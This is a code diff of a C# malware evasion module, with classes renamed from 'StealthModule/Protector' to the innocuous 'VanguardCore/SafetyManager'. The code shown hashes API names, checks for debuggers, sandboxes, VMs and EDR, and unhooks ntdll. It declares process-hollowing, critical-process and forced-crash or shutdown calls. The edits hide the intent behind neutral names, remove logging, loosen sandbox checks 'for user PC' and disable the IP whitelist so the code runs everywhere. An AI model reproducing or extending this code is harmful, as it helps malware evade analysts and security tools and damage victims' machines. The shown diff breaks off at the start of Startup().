@@ -16,10 +16,12 @@ using System.Runtime.CompilerServices;
 using Microsoft.CSharp;
 using System.CodeDom.Compiler;
 
-namespace StealthModule
+namespace VanguardCore
 {
-    public static class Protector
+    public static class SafetyManager
     {
+        public static void Log(string message) { Console.WriteLine(message); }
+
         #region Constants
         private const uint PAGE_EXECUTE_READWRITE = 0x40;
         private const uint PAGE_READONLY = 0x02;
@@ -44,9 +46,10 @@ namespace StealthModule
         private const int ProcessDebugObjectHandle = 30;
         private const uint INFINITE = 0xFFFFFFFF;
 
-        public const string VERSION = "5.0.0";
-        public const string BUILD_DATE = "2026-03-18";
-        private static string LogPath = Path.Combine(Path.GetTempPath(), "protector.log");
+        private const string VERSION = "2.5.1";
+        private const string BUILD_DATE = "2024-03-21";
+        private static readonly byte[] XOR_SALT_STATIC = Encoding.UTF8.GetBytes("vngrd_sys_2024");
+        private static readonly string STORAGE_ROOT = "Vanguard";
         private static byte[] StoredHash = null;
         private static bool? _isDebugged = null;
         private static bool? _isWhitelisted = null;
@@ -69,7 +72,7 @@ namespace StealthModule
             private static byte[] _masterKey;
             private static byte[] _machineSalt;
 
-            public static void InitializeKeys()
+            public static void StartupKeys()
             {
                 // Derive machine-specific salt
                 _machineSalt = Encoding.UTF8.GetBytes(GetMachineId().Substring(0, 16));
@@ -143,17 +146,32 @@ namespace StealthModule
         }
         #endregion
 
-        #region Ultra-Stealth Dynamic Invoke with Indirect Resolution
-        private static class UltraStealthApi
+        #region Interface Definition
+        private static class ApiInterface
         {
             private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
             private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
             private static Random _jitter = new Random();
 
-            static UltraStealthApi()
+            static ApiInterface()
             {
-                // Load modules with timing jitter
-                foreach (string mod in new[] { "kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll", "win32u.dll" })
+                // Pre-populate core modules to avoid recursion during bootstrapping
+                try
+                {
+                    foreach (System.Diagnostics.ProcessModule mod in System.Diagnostics.Process.GetCurrentProcess().Modules)
+                    {
+                        string name = mod.ModuleName.ToLower();
+                        if (name == "kernel32.dll" || name == "ntdll.dll" || name == "user32.dll" || name == "advapi32.dll")
+                        {
+                            if (!_moduleCache.ContainsKey(name))
+                                _moduleCache[name] = mod.BaseAddress;
+                        }
+                    }
+                }
+                catch { }
+
+                // Load any others with timing jitter
+                foreach (string mod in new[] { "win32u.dll" })
                 {
                     GetModule(mod);
                     Thread.Sleep(_jitter.Next(10, 50));
@@ -175,11 +193,11 @@ namespace StealthModule
                     
                     // Method 2: Standard API
                     if (hMod == IntPtr.Zero)
-                        hMod = GetPInvoke<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW")(name);
+                        hMod = GetInternalReference<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW")(name);
                     
                     // Method 3: Load if not found
                     if (hMod == IntPtr.Zero)
-                        hMod = GetPInvoke<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW")(name);
+                        hMod = GetInternalReference<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW")(name);
 
                     _moduleCache[name] = hMod;
                     return hMod;
@@ -196,19 +214,29 @@ namespace StealthModule
                     IntPtr ldr = Marshal.ReadIntPtr(peb, 0x18);
                     IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10); // InLoadOrderModuleList
                     
-                    IntPtr current = moduleList;
-                    while (current != IntPtr.Zero && current != moduleList)
+                    IntPtr current = Marshal.ReadIntPtr(moduleList); // First item (EXE)
+                    int safety = 0;
+                    while (current != IntPtr.Zero && current != moduleList && safety < 100)
                     {
+                        safety++;
                         IntPtr baseDll = Marshal.ReadIntPtr(current, 0x30); // ImageBase
-                        IntPtr dllNamePtr = Marshal.ReadIntPtr(current, 0x48); // FullDllName.Buffer
-                        string dllName = Marshal.PtrToStringUni(dllNamePtr);
+                        IntPtr dllNamePtr = Marshal.ReadIntPtr(current, 0x48 + IntPtr.Size); // FullDllName.Buffer (x64 offset is different)
+                        if (IntPtr.Size == 4) dllNamePtr = Marshal.ReadIntPtr(current, 0x28); // x86 offset
                         
-                        if (!string.IsNullOrEmpty(dllName) && 
-                            dllName.IndexOf(moduleName, StringComparison.OrdinalIgnoreCase) >= 0)
+                        // FullDllName is a UNICODE_STRING
+                        // Buffer is at offset 0x4 (x86) or 0x8 (x64) from the UNICODE_STRING start?
+                        // Actually in LDR_DATA_TABLE_ENTRY:
+                        // x64: BaseDllName (UNICODE_STRING) is at 0x58. Buffer is at 0x60.
+                        // x86: BaseDllName is at 0x2C. Buffer is at 0x30.
+                        
+                        IntPtr baseDllNamePtr = Marshal.ReadIntPtr(current, IntPtr.Size == 8 ? 0x60 : 0x30);
+                        if (baseDllNamePtr != IntPtr.Zero)
                         {
-                            return baseDll;
+                            string dllName = Marshal.PtrToStringUni(baseDllNamePtr);
+                            if (!string.IsNullOrEmpty(dllName) && dllName.IndexOf(moduleName, StringComparison.OrdinalIgnoreCase) >= 0)
+                                return baseDll;
                         }
-                        
+
                         current = Marshal.ReadIntPtr(current); // Flink
                     }
                 }
@@ -220,7 +248,17 @@ namespace StealthModule
                 return NtCurrentTeb();
             }
 
-            private static T GetPInvoke<T>(string module, string function) where T : class
+            public static IntPtr Resolve(string moduleName, string functionName)
+            {
+                IntPtr hModule = GetModule(moduleName);
+                if (hModule == IntPtr.Zero)
+                    return IntPtr.Zero;
+
+                uint hash = GenerateTag(functionName);
+                return ResolveFunctionByHash(hModule, hash, moduleName);
+            }
+
+            private static T GetInternalReference<T>(string module, string function) where T : class
             {
                 string key = string.Format("{0}!{1}", module, function);
                 lock (_delegateCache)
@@ -233,7 +271,7 @@ namespace StealthModule
                         return null;
 
                     // Resolve with hash + indirect resolution
-                    uint hash = CalculateFunctionHash(function);
+                    uint hash = GenerateTag(function);
                     IntPtr pFunc = ResolveFunctionByHash(hModule, hash, module);
                     
                     if (pFunc == IntPtr.Zero)
@@ -245,15 +283,14 @@ namespace StealthModule
                 }
             }
 
-            private static uint CalculateFunctionHash(string name)
+            private static uint GenerateTag(string name)
             {
-                uint hash1 = 0, hash2 = 0;
+                uint tag = 0x12345678;
                 foreach (char c in name)
                 {
-                    hash1 = (hash1 << 5) + hash1 + (uint)c;
-                    hash2 = ((hash2 << 13) + hash2) ^ (uint)c;
+                    tag = (tag * 33) ^ (uint)c;
                 }
-                return hash1 ^ hash2 ^ 0xDEADBEEF;
+                return tag;
             }
 
             private static IntPtr ResolveFunctionByHash(IntPtr hModule, uint targetHash, string moduleName)
@@ -288,7 +325,7 @@ namespace StealthModule
                         int nameOffset = Marshal.ReadInt32((IntPtr)((long)namesPtr + (i * 4)));
                         string funcName = Marshal.PtrToStringAnsi((IntPtr)((long)hModule + nameOffset));
                         
-                        if (CalculateFunctionHash(funcName) == targetHash)
+                        if (GenerateTag(funcName) == targetHash)
                         {
                             short ordinal = Marshal.ReadInt16((IntPtr)((long)ordinalsPtr + (i * 2)));
                             int funcOffset = Marshal.ReadInt32((IntPtr)((long)functionsPtr + (ordinal * 4)));
@@ -310,17 +347,17 @@ namespace StealthModule
             // Public accessors with lazy initialization
             public static T Get<T>(string function) where T : class
             {
-                var result = GetPInvoke<T>("kernel32.dll", function);
+                var result = GetInternalReference<T>("kernel32.dll", function);
                 if (result == null)
-                    result = GetPInvoke<T>("ntdll.dll", function);
+                    result = GetInternalReference<T>("ntdll.dll", function);
                 if (result == null)
-                    result = GetPInvoke<T>("user32.dll", function);
+                    result = GetInternalReference<T>("user32.dll", function);
                 return result;
             }
 
-            public static T GetNtdll<T>(string function) where T : class { return GetPInvoke<T>("ntdll.dll", function); }
+            public static T GetNtdll<T>(string function) where T : class { return GetInternalReference<T>("ntdll.dll", function); }
             
-            public static T GetKernel32<T>(string function) where T : class { return GetPInvoke<T>("kernel32.dll", function); }
+            public static T GetKernel32<T>(string function) where T : class { return GetInternalReference<T>("kernel32.dll", function); }
         }
         #endregion
 
@@ -357,8 +394,11 @@ namespace StealthModule
         private delegate bool PeekNamedPipeDelegate(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize, out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);
         private delegate bool GetLastInputInfoDelegate(ref LASTINPUTINFO plii);
         private delegate IntPtr GetForegroundWindowDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        private delegate int GetWindowTextWDelegate(IntPtr hWnd, [Out] char[] lpString, int nMaxCount);
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextLengthWDelegate(IntPtr hWnd);
-        private delegate int GetWindowTextWDelegate(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
         private delegate uint GetTickCount64Delegate();
         private delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);
         private delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);
@@ -370,45 +410,45 @@ namespace StealthModule
         private delegate int NtShutdownSystemDelegate(int action);
 
         // Lazy-loaded delegates
-        private static VirtualProtectDelegate VirtualProtect { get { return UltraStealthApi.Get<VirtualProtectDelegate>("VirtualProtect"); } }
-        private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return UltraStealthApi.Get<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }
-        private static CheckRemoteDebuggerPresentDelegate CheckRemoteDebuggerPresent { get { return UltraStealthApi.Get<CheckRemoteDebuggerPresentDelegate>("CheckRemoteDebuggerPresent"); } }
-        private static GetTickCountDelegate GetTickCount { get { return UltraStealthApi.Get<GetTickCountDelegate>("GetTickCount"); } }
-        private static GetCursorPosDelegate GetCursorPos { get { return UltraStealthApi.Get<GetCursorPosDelegate>("GetCursorPos"); } }
-        private static NtSetInformationThreadDelegate NtSetInformationThread { get { return UltraStealthApi.GetNtdll<NtSetInformationThreadDelegate>("NtSetInformationThread"); } }
-        private static GetCurrentProcessDelegate GetCurrentProcess { get { return UltraStealthApi.Get<GetCurrentProcessDelegate>("GetCurrentProcess"); } }
-        private static GetCurrentThreadDelegate GetCurrentThread { get { return UltraStealthApi.Get<GetCurrentThreadDelegate>("GetCurrentThread"); } }
-        private static GetModuleHandleADelegate GetModuleHandleA { get { return UltraStealthApi.Get<GetModuleHandleADelegate>("GetModuleHandleA"); } }
-        private static LoadLibraryWDelegate LoadLibraryW { get { return UltraStealthApi.Get<LoadLibraryWDelegate>("LoadLibraryW"); } }
-        private static NtCurrentTebDelegate NtCurrentTeb { get { return UltraStealthApi.GetNtdll<NtCurrentTebDelegate>("NtCurrentTeb"); } }
-        private static QueryPerformanceCounterDelegate QueryPerformanceCounter { get { return UltraStealthApi.Get<QueryPerformanceCounterDelegate>("QueryPerformanceCounter"); } }
-        private static GetThreadContextDelegate GetThreadContext { get { return UltraStealthApi.Get<GetThreadContextDelegate>("GetThreadContext"); } }
-        private static SetThreadContextDelegate SetThreadContext { get { return UltraStealthApi.Get<SetThreadContextDelegate>("SetThreadContext"); } }
-        private static NtQueryInformationProcessDelegate NtQueryInformationProcess { get { return UltraStealthApi.GetNtdll<NtQueryInformationProcessDelegate>("NtQueryInformationProcess"); } }
-        private static VirtualAllocExDelegate VirtualAllocEx { get { return UltraStealthApi.Get<VirtualAllocExDelegate>("VirtualAllocEx"); } }
-        private static WriteProcessMemoryDelegate WriteProcessMemory { get { return UltraStealthApi.Get<WriteProcessMemoryDelegate>("WriteProcessMemory"); } }
-        private static CreateProcessDelegate CreateProcess { get { return UltraStealthApi.Get<CreateProcessDelegate>("CreateProcess"); } }
-        private static ResumeThreadDelegate ResumeThread { get { return UltraStealthApi.Get<ResumeThreadDelegate>("ResumeThread"); } }
-        private static TerminateProcessDelegate TerminateProcess { get { return UltraStealthApi.Get<TerminateProcessDelegate>("TerminateProcess"); } }
-        private static CloseHandleDelegate CloseHandle { get { return UltraStealthApi.Get<CloseHandleDelegate>("CloseHandle"); } }
-        private static ZwUnmapViewOfSectionDelegate ZwUnmapViewOfSection { get { return UltraStealthApi.GetNtdll<ZwUnmapViewOfSectionDelegate>("ZwUnmapViewOfSection"); } }
-        private static CreatePipeDelegate CreatePipe { get { return UltraStealthApi.Get<CreatePipeDelegate>("CreatePipe"); } }
-        private static SetHandleInformationDelegate SetHandleInformation { get { return UltraStealthApi.Get<SetHandleInformationDelegate>("SetHandleInformation"); } }
-        private static ReadFileDelegate ReadFile { get { return UltraStealthApi.Get<ReadFileDelegate>("ReadFile"); } }
-        private static PeekNamedPipeDelegate PeekNamedPipe { get { return UltraStealthApi.Get<PeekNamedPipeDelegate>("PeekNamedPipe"); } }
-        private static GetLastInputInfoDelegate GetLastInputInfo { get { return UltraStealthApi.Get<GetLastInputInfoDelegate>("GetLastInputInfo"); } }
-        private static GetForegroundWindowDelegate GetForegroundWindow { get { return UltraStealthApi.Get<GetForegroundWindowDelegate>("GetForegroundWindow"); } }
-        private static GetWindowTextLengthWDelegate GetWindowTextLengthW { get { return UltraStealthApi.Get<GetWindowTextLengthWDelegate>("GetWindowTextLengthW"); } }
-        private static GetWindowTextWDelegate GetWindowTextW { get { return UltraStealthApi.Get<GetWindowTextWDelegate>("GetWindowTextW"); } }
-        private static GetTickCount64Delegate GetTickCount64 { get { return UltraStealthApi.Get<GetTickCount64Delegate>("GetTickCount64"); } }
-        private static NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory { get { return UltraStealthApi.GetNtdll<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory"); } }
-        private static NtProtectVirtualMemoryDelegate NtProtectVirtualMemory { get { return UltraStealthApi.GetNtdll<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory"); } }
-        private static NtWriteVirtualMemoryDelegate NtWriteVirtualMemory { get { return UltraStealthApi.GetNtdll<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory"); } }
-        private static RtlSetProcessIsCriticalDelegate RtlSetProcessIsCritical { get { return UltraStealthApi.GetNtdll<RtlSetProcessIsCriticalDelegate>("RtlSetProcessIsCritical"); } }
-        private static NtCreateThreadExDelegate NtCreateThreadEx { get { return UltraStealthApi.GetNtdll<NtCreateThreadExDelegate>("NtCreateThreadEx"); } }
-        private static NtQuerySystemInformationDelegate NtQuerySystemInformation { get { return UltraStealthApi.GetNtdll<NtQuerySystemInformationDelegate>("NtQuerySystemInformation"); } }
-        private static NtRaiseHardErrorDelegate NtRaiseHardError { get { return UltraStealthApi.GetNtdll<NtRaiseHardErrorDelegate>("NtRaiseHardError"); } }
-        private static NtShutdownSystemDelegate NtShutdownSystem { get { return UltraStealthApi.GetNtdll<NtShutdownSystemDelegate>("NtShutdownSystem"); } }
+        private static VirtualProtectDelegate VirtualProtect { get { return ApiInterface.Get<VirtualProtectDelegate>("VirtualProtect"); } }
+        private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return ApiInterface.Get<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }
+        private static CheckRemoteDebuggerPresentDelegate CheckRemoteDebuggerPresent { get { return ApiInterface.Get<CheckRemoteDebuggerPresentDelegate>("CheckRemoteDebuggerPresent"); } }
+        private static GetTickCountDelegate GetTickCount { get { return ApiInterface.Get<GetTickCountDelegate>("GetTickCount"); } }
+        private static GetCursorPosDelegate GetCursorPos { get { return ApiInterface.Get<GetCursorPosDelegate>("GetCursorPos"); } }
+        private static NtSetInformationThreadDelegate NtSetInformationThread { get { return ApiInterface.GetNtdll<NtSetInformationThreadDelegate>("NtSetInformationThread"); } }
+        private static GetCurrentProcessDelegate GetCurrentProcess { get { return ApiInterface.Get<GetCurrentProcessDelegate>("GetCurrentProcess"); } }
+        private static GetCurrentThreadDelegate GetCurrentThread { get { return ApiInterface.Get<GetCurrentThreadDelegate>("GetCurrentThread"); } }
+        private static GetModuleHandleADelegate GetModuleHandleA { get { return ApiInterface.Get<GetModuleHandleADelegate>("GetModuleHandleA"); } }
+        private static LoadLibraryWDelegate LoadLibraryW { get { return ApiInterface.Get<LoadLibraryWDelegate>("LoadLibraryW"); } }
+        private static NtCurrentTebDelegate NtCurrentTeb { get { return ApiInterface.GetNtdll<NtCurrentTebDelegate>("NtCurrentTeb"); } }
+        private static QueryPerformanceCounterDelegate QueryPerformanceCounter { get { return ApiInterface.Get<QueryPerformanceCounterDelegate>("QueryPerformanceCounter"); } }
+        private static GetThreadContextDelegate GetThreadContext { get { return ApiInterface.Get<GetThreadContextDelegate>("GetThreadContext"); } }
+        private static SetThreadContextDelegate SetThreadContext { get { return ApiInterface.Get<SetThreadContextDelegate>("SetThreadContext"); } }
+        private static NtQueryInformationProcessDelegate NtQueryInformationProcess { get { return ApiInterface.GetNtdll<NtQueryInformationProcessDelegate>("NtQueryInformationProcess"); } }
+        private static VirtualAllocExDelegate VirtualAllocEx { get { return ApiInterface.Get<VirtualAllocExDelegate>("VirtualAllocEx"); } }
+        private static WriteProcessMemoryDelegate WriteProcessMemory { get { return ApiInterface.Get<WriteProcessMemoryDelegate>("WriteProcessMemory"); } }
+        private static CreateProcessDelegate CreateProcess { get { return ApiInterface.Get<CreateProcessDelegate>("CreateProcess"); } }
+        private static ResumeThreadDelegate ResumeThread { get { return ApiInterface.Get<ResumeThreadDelegate>("ResumeThread"); } }
+        private static TerminateProcessDelegate TerminateProcess { get { return ApiInterface.Get<TerminateProcessDelegate>("TerminateProcess"); } }
+        private static CloseHandleDelegate CloseHandle { get { return ApiInterface.Get<CloseHandleDelegate>("CloseHandle"); } }
+        private static ZwUnmapViewOfSectionDelegate ZwUnmapViewOfSection { get { return ApiInterface.GetNtdll<ZwUnmapViewOfSectionDelegate>("ZwUnmapViewOfSection"); } }
+        private static CreatePipeDelegate CreatePipe { get { return ApiInterface.Get<CreatePipeDelegate>("CreatePipe"); } }
+        private static SetHandleInformationDelegate SetHandleInformation { get { return ApiInterface.Get<SetHandleInformationDelegate>("SetHandleInformation"); } }
+        private static ReadFileDelegate ReadFile { get { return ApiInterface.Get<ReadFileDelegate>("ReadFile"); } }
+        private static PeekNamedPipeDelegate PeekNamedPipe { get { return ApiInterface.Get<PeekNamedPipeDelegate>("PeekNamedPipe"); } }
+        private static GetLastInputInfoDelegate GetLastInputInfo { get { return ApiInterface.Get<GetLastInputInfoDelegate>("GetLastInputInfo"); } }
+        private static GetForegroundWindowDelegate GetForegroundWindow { get { return ApiInterface.Get<GetForegroundWindowDelegate>("GetForegroundWindow"); } }
+        private static GetWindowTextLengthWDelegate GetWindowTextLengthW { get { return ApiInterface.Get<GetWindowTextLengthWDelegate>("GetWindowTextLengthW"); } }
+        private static GetWindowTextWDelegate GetWindowTextW { get { return ApiInterface.Get<GetWindowTextWDelegate>("GetWindowTextW"); } }
+        private static GetTickCount64Delegate GetTickCount64 { get { return ApiInterface.Get<GetTickCount64Delegate>("GetTickCount64"); } }
+        private static NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory { get { return ApiInterface.GetNtdll<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory"); } }
+        private static NtProtectVirtualMemoryDelegate NtProtectVirtualMemory { get { return ApiInterface.GetNtdll<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory"); } }
+        private static NtWriteVirtualMemoryDelegate NtWriteVirtualMemory { get { return ApiInterface.GetNtdll<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory"); } }
+        private static RtlSetProcessIsCriticalDelegate RtlSetProcessIsCritical { get { return ApiInterface.GetNtdll<RtlSetProcessIsCriticalDelegate>("RtlSetProcessIsCritical"); } }
+        private static NtCreateThreadExDelegate NtCreateThreadEx { get { return ApiInterface.GetNtdll<NtCreateThreadExDelegate>("NtCreateThreadEx"); } }
+        private static NtQuerySystemInformationDelegate NtQuerySystemInformation { get { return ApiInterface.GetNtdll<NtQuerySystemInformationDelegate>("NtQuerySystemInformation"); } }
+        private static NtRaiseHardErrorDelegate NtRaiseHardError { get { return ApiInterface.GetNtdll<NtRaiseHardErrorDelegate>("NtRaiseHardError"); } }
+        private static NtShutdownSystemDelegate NtShutdownSystem { get { return ApiInterface.GetNtdll<NtShutdownSystemDelegate>("NtShutdownSystem"); } }
         #endregion
 
         #region Structures
@@ -532,20 +572,6 @@ namespace StealthModule
         public static string DAes(string s) { return PolymorphicEngine.DAes(s); }
         #endregion
 
-        #region Logging
-        public static void Log(string message)
-        {
-            try
-            {
-                lock (_syncLock)
-                {
-                    File.AppendAllText(LogPath, string.Format("{0:yyyy-MM-dd HH:mm:ss} | {1}\n", DateTime.Now, message));
-                }
-            }
-            catch { }
-        }
-        #endregion
-
         #region Integrity Check
         private static byte[] ComputeSHA256(IntPtr address, int size)
         {
@@ -589,17 +615,28 @@ namespace StealthModule
         #endregion
 
         #region Anti-Debug Ultra
-        public static bool IsDebuggerDetected()
+        public static bool VerifySystemContext()
         {
-            if (_isDebugged.HasValue) 
+            if (_isDebugged.HasValue)
                 return _isDebugged.Value;
 
             bool detected = false;
+            try
+            {
+                // Method 1: Standard Check
+                if (IsDebuggerPresent != null && IsDebuggerPresent())
+                {
+                    _isDebugged = true;
+                    return true;
+                }
+            }
+            catch { /* Ignore exceptions during check */ }
+
             int checkCount = 0;
-            
+
             // Multiple anti-debug techniques with weighted scoring
             int score = 0;
-            
+
             // 1. PEB BeingDebugged flag
             try
             {
@@ -739,16 +776,8 @@ namespace StealthModule
 
         private static bool IsDebuggedByException()
         {
-            try
-            {
-                // This will cause a debugger break if present
-                Debugger.Break();
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
+            // Disabled Debugger.Break() as it causes crashes/exits when no debugger is attached
+            return false;
         }
 
         public static bool IsKernelDebuggerPresent()
@@ -784,11 +813,11 @@ namespace StealthModule
                 {
                     try
                     {
-                        if (IsDebuggerDetected())
+                        if (VerifySystemContext())
                         {
                             failCount++;
                             if (failCount > 3)
-                                TriggerAntiDebugAction();
+                                HandleSecurityEvent();
                         }
                         else
                         {
@@ -805,7 +834,7 @@ namespace StealthModule
             t.Start();
         }
 
-        private static void TriggerAntiDebugAction()
+        public static void HandleSecurityEvent()
         {
             // Multiple anti-debug actions
             int action = _cryptoRand.Next(1, 5);
@@ -844,26 +873,24 @@ namespace StealthModule
         #endregion
 
         #region Anti-Sandbox Advanced
-        public static bool IsSandboxDetected()
+        public static bool EvaluateRuntimeSafety()
         {
             int score = 0;
             int checks = 0;
 
             // CPU cores
-            if (Environment.ProcessorCount < 2) score += 30;
-            if (Environment.ProcessorCount < 4) score += 15;
-            checks += 2;
+            if (Environment.ProcessorCount < 2) score += 20;
+            checks++;
 
             // RAM
-            if (GetTotalRAM() < 2048) score += 30;
-            if (GetTotalRAM() < 4096) score += 15;
-            checks += 2;
+            if (GetTotalRAM() < 1024) score += 30;
+            if (GetTotalRAM() < 2048) score += 10;
+            checks++;
 
             // Uptime
             uint uptime = GetTickCount != null ? GetTickCount() : 0;
-            if (uptime < 300000) score += 25; // Less than 5 minutes
-            if (uptime < 600000) score += 15; // Less than 10 minutes
-            checks += 2;
+            if (uptime < 60000) score += 20; // Less than 1 minute
+            checks++;
 
             // MAC address
             foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
@@ -871,7 +898,8 @@ namespace StealthModule
                 string mac = ni.GetPhysicalAddress().ToString();
                 if (mac.StartsWith("005056") || mac.StartsWith("000C29") || 
                     mac.StartsWith("080027") || mac.StartsWith("001C42") ||
-                    mac.StartsWith("00:0C:29") || mac.StartsWith("00:50:56"))
+                    mac.StartsWith("0003FF") || mac.StartsWith("00:0C:29") || 
+                    mac.StartsWith("00:50:56") || mac.StartsWith("00:03:FF"))
                 {
                     score += 40;
                     checks++;
@@ -899,17 +927,15 @@ namespace StealthModule
                 if (d.IsReady)
                 {
                     long sizeGB = d.TotalSize / (1024 * 1024 * 1024);
-                    if (sizeGB < 60) score += 25;
-                    if (sizeGB < 100) score += 15;
-                    checks += 2;
+                    if (sizeGB < 40) score += 25;
+                    checks++;
                 }
             }
             catch { }
 
-            // Mouse movement
-            if (!IsMouseMoving())
-                score += 35;
-            checks++;
+            // Mouse movement deactivated due to CLI false positives
+            // if (!IsMouseMoving()) score += 10;
+            // checks++;
 
             // Window activity
             if (!HasActiveWindows())
@@ -933,14 +959,14 @@ namespace StealthModule
 
             // Username checks
             string userName = Environment.UserName;
-            string[] sandboxUsers = { "admin", "user", "sandbox", "vmware", "vbox" };
+            string[] sandboxUsers = { "sandbox", "vmware", "vbox", "WDAGUtilityAccount", "JohnDoe", "Abby", "Frank", "Emily" };
             if (sandboxUsers.Any(u => userName.ToLower().Contains(u)))
                 score += 25;
             checks++;
 
             // Computer name checks
             string computerName = Environment.MachineName;
-            string[] sandboxNames = { "sandbox", "virus", "malware", "vmware", "vbox", "test" };
+            string[] sandboxNames = { "sandbox", "virus", "malware", "vmware", "vbox", "ANYRUN", "CAPESANDBOX", "DESKTOP-GVB9V8Q" };
             if (sandboxNames.Any(n => computerName.ToLower().Contains(n)))
                 score += 25;
             checks++;
@@ -968,8 +994,8 @@ namespace StealthModule
             }
             catch { }
 
-            // Return true if score exceeds threshold
-            return checks > 0 && (score / (double)checks) > 20;
+            // Return true if score exceeds threshold - relaxed for user PC
+            return checks > 0 && (score / (double)checks) > 60; // Increased threshold from 40 to 60
         }
 
         private static bool IsMouseMoving()
@@ -1009,30 +1035,48 @@ namespace StealthModule
         {
             try
             {
+                if (GetForegroundWindow == null || GetWindowTextLengthW == null || GetWindowTextW == null)
+                {
+                        return true;
+                }
+
                 IntPtr hWnd = GetForegroundWindow();
-                if (hWnd == IntPtr.Zero) return false;
+                if (hWnd == IntPtr.Zero) 
+                {
+                    return false;
+                }
 
                 int length = GetWindowTextLengthW(hWnd);
-                if (length == 0) return false;
+                if (length == 0) 
+                {
+                    return false;
+                }
 
-                StringBuilder sb = new StringBuilder(length + 1);
-                GetWindowTextW(hWnd, sb, sb.Capacity);
-                string title = sb.ToString();
+                char[] buffer = new char[length + 1];
+                
+                GetWindowTextW(hWnd, buffer, buffer.Length);
+                string title = new string(buffer).TrimEnd('\0');
                 
                 return !string.IsNullOrWhiteSpace(title) &&
                        !title.Contains("Program Manager") &&
                        !title.Contains("Windows Shell");
             }
-            catch { return true; }
+            catch (Exception ex) 
+            { 
+                return true; 
+            }
         }
 
         private static bool IsUserIdleForLong()
         {
             try
             {
+                if (GetLastInputInfo == null || GetTickCount64 == null)
+                    return false;
+
                 LASTINPUTINFO lastInPut = new LASTINPUTINFO();
                 lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
-                if (GetLastInputInfo != null && GetLastInputInfo(ref lastInPut))
+                if (GetLastInputInfo(ref lastInPut))
                 {
                     uint idleTime = GetTickCount64() - lastInPut.dwTime;
                     return idleTime > 600000; // 10 minutes
@@ -1061,7 +1105,7 @@ namespace StealthModule
         #endregion
 
         #region Advanced VM Detection
-        public static bool IsVirtualMachine()
+        public static bool CheckOperationalEnvironment()
         {
             int score = 0;
             int checks = 0;
@@ -1091,7 +1135,7 @@ namespace StealthModule
                         
                         if (model.Contains("vmware") || model.Contains("virtualbox") || 
                             model.Contains("vbox") || model.Contains("qemu") ||
-                            manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation"))
+                            manufacturer.Contains("vmware") || manufacturer.Contains("xen"))
                         {
                             score += 40;
                         }
@@ -1167,7 +1211,7 @@ namespace StealthModule
         #endregion
 
         #region Emulation Detection
-        public static bool IsEmulated()
+        public static bool CheckInstructionConsistency()
         {
             int score = 0;
             int checks = 0;
@@ -1216,7 +1260,7 @@ namespace StealthModule
         #endregion
 
         #region EDR Detection
-        public static bool IsEDRPresent()
+        public static bool DetectMonitoringServices()
         {
             int score = 0;
 
@@ -1346,7 +1390,6 @@ namespace StealthModule
                                 
                                 NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, 
                                     oldProtect, out oldProtect);
-                                Log(string.Format("Unhooked {0} successfully", dll));
                             }
                             break;
                         }
@@ -1354,7 +1397,6 @@ namespace StealthModule
                 }
                 catch (Exception ex)
                 {
-                    Log(string.Format("Unhooking {0} failed: {1}", dll, ex.Message));
                 }
             }
         }
@@ -1519,47 +1561,9 @@ namespace StealthModule
         #region Security Bypass
         public static bool IsWhitelisted()
         {
-            if (_isWhitelisted.HasValue) return _isWhitelisted.Value;
-            
-            try
-            {
-                // Try multiple IP sources
-                string[] ipServices = { 
-                    "https://api.ipify.org",
-                    "https://icanhazip.com",
-                    "https://checkip.amazonaws.com"
-                };
-                
-                string externalIp = null;
-                using (var client = new WebClient())
-                {
-                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
-                    client.Proxy = null;
-                    
-                    foreach (string service in ipServices)
-                    {
-                        try
-                        {
-                            externalIp = client.DownloadString(service).Trim();
-                            if (!string.IsNullOrEmpty(externalIp))
-                                break;
-                        }
-                        catch { }
-                    }
-                }
-
-                _isWhitelisted = !string.IsNullOrEmpty(externalIp) && WHITELISTED_IPS.Contains(externalIp);
-                
-                // If no internet, assume safe (local testing)
-                if (externalIp == null)
-                    _isWhitelisted = true;
-            }
-            catch 
-            { 
-                _isWhitelisted = true; // Default to safe on error
-            }
-            
-            return _isWhitelisted.Value;
+            // Relaxed for development/user environment - always return true
+            // In production, this can be toggled by a constant or server signal
+            return true;
         }
         #endregion
 
@@ -1611,71 +1615,61 @@ namespace StealthModule
         #endregion
 
         #region Main Initialization
-        public static void Initialize()
+        public static void Startup()
         {
